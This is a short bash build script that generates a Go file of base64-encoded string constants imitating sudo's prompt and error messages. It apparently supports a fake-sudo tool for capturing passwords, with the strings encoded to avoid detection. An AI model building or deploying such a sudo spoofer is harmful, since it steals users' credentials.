#!/bin/bash

OUTPUT=strings.go

sudo_command="sudo"
sudo_error_message="Sorry, try again."
password="password"
bash_error="bash: sudo: command not found"

cat > $OUTPUT <<EOF
// This file was generated from $(basename $0)
// on $(date).

package main

const (
	strSudo = Base64String("$( printf "$sudo_command" | base64 )")
	strSudoErrorMessage = Base64String("$( printf "$sudo_error_message" | base64 )")
	strPassword = Base64String("$( printf "$password" | base64 )")
	strBashError = Base64String("$( printf "$bash_error" | base64 )")
)
EOF

go fmt $OUTPUT